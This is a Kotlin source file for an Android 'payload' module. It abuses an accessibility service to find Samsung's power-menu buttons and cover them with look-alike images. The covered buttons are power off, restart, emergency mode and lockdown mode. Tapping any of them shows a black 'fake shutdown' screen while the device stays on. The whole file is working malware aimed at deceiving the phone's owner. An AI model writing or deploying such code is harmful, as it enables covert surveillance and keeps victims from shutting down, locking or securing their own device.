package com.speedster.payload

import android.content.Context
import android.graphics.BitmapFactory
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.platform.LocalDensity
import androidx.compose.ui.unit.dp
import com.speedster.DynamicEntry
import java.io.File

class PayloadEntry : DynamicEntry {
    // Map of Sticker Name to Screen Bounds
    private val stickerBounds = mutableStateMapOf<String, Rect>()
    private var isHijackActive by mutableStateOf(false)

    override @Composable fun Render(context: Context, resDir: File) {
        val density = LocalDensity.current

        // Load Bitmaps from resDir
        val images = remember(resDir) {
            mapOf(
                "Power off" to loadBitmap(resDir, "power.png"),
                "Restart" to loadBitmap(resDir, "restart.png"),
                "Emergency mode" to loadBitmap(resDir, "emergency.png"),
                "Lockdown mode" to loadBitmap(resDir, "lockdown.png"),
                "Side key settings" to loadBitmap(resDir, "sidekey.png")
            )
        }

        LaunchedEffect(Unit) {
            DynamicEntry.log("👻 Ghost active. Target: Samsung Power Menu")
            
            DynamicEntry.accessibilityInterceptor = { event ->
                if (event.packageName == "com.android.systemui") {
                    val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                    root?.let { 
                        updateStickerMap(it)
                        // If we found stickers, activate hijack
                        val foundAny = stickerBounds.isNotEmpty()
                        if (foundAny != isHijackActive) {
                            isHijackActive = foundAny
                            DynamicEntry.log(if (foundAny) "🎯 TARGET LOCKED: Stickers Matched" else "📉 TARGET LOST: Cleaning up")
                            DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                                flags = if (foundAny) 
                                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                    else android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                                alpha = 1.0f
                            )
                        }
                    }
                } else if (isHijackActive) {
                    isHijackActive = false
                    stickerBounds.clear()
                    DynamicEntry.overlayContent = null
                }
            }
        }

        // --- THE HIJACK UI ---
        SideEffect {
            if (isHijackActive) {
                DynamicEntry.overlayContent = { 
                    Box(modifier = Modifier.fillMaxSize()) {
                        stickerBounds.forEach { (name, rect) ->
                            val bitmap = images[name]
                            if (bitmap != null) {
                                Box(
                                    modifier = Modifier
                                        .offset(
                                            x = with(density) { rect.left.toDp() },
                                            y = with(density) { rect.top.toDp() }
                                        )
                                        .size(
                                            width = with(density) { (rect.right - rect.left).toDp() },
                                            height = with(density) { (rect.bottom - rect.top).toDp() }
                                        )
                                        .clickable { 
                                            DynamicEntry.log("⚡ HIJACK TRIGGERED: User tapped $name")
                                            // FAKE SHUTDOWN START
                                            DynamicEntry.overlayContent = { 
                                                Box(modifier = Modifier.fillMaxSize().background(Color.Black)) 
                                            }
                                        }
                                ) {
                                    Image(bitmap = bitmap, contentDescription = null, modifier = Modifier.fillMaxSize())
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    private fun updateStickerMap(node: AccessibilityNodeInfo) {
        val foundThisPass = mutableSetOf<String>()
        crawl(node, foundThisPass)
        // Remove stickers that vanished from the screen
        val toRemove = stickerBounds.keys.filter { it !in foundThisPass }
        toRemove.forEach { stickerBounds.remove(it) }
    }

    private fun crawl(node: AccessibilityNodeInfo?, found: MutableSet<String>) {
        if (node == null) return
        
        val id = node.viewIdResourceName ?: ""
        val text = node.text?.toString() ?: node.contentDescription?.toString() ?: ""

        // Target Samsung's specific IDs
        if (id.contains("sec_global_actions_icon_label_view") || id.contains("sec_global_actions_key_settings")) {
            val labelNode = findLabelChild(node)
            val labelText = labelNode?.text?.toString() ?: labelNode?.contentDescription?.toString() ?: ""
            
            val stickerName = when {
                labelText.contains("Power off", true) -> "Power off"
                labelText.contains("Restart", true) -> "Restart"
                labelText.contains("Emergency", true) -> "Emergency mode"
                labelText.contains("Lockdown", true) -> "Lockdown mode"
                id.contains("key_settings") -> "Side key settings"
                else -> null
            }

            if (stickerName != null) {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                stickerBounds[stickerName] = rect
                found.add(stickerName)
            }
        }

        for (i in 0 until node.childCount) {
            crawl(node.getChild(i), found)
        }
    }

    private fun findLabelChild(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.viewIdResourceName?.contains("label") == true) return node
        for (i in 0 until node.childCount) {
            val found = findLabelChild(node.getChild(i) ?: continue)
            if (found != null) return found
        }
        return null
    }

    private fun loadBitmap(resDir: File, name: String) = try {
        BitmapFactory.decodeFile(File(resDir, name).absolutePath).asImageBitmap()
    } catch (e: Exception) { null }
}
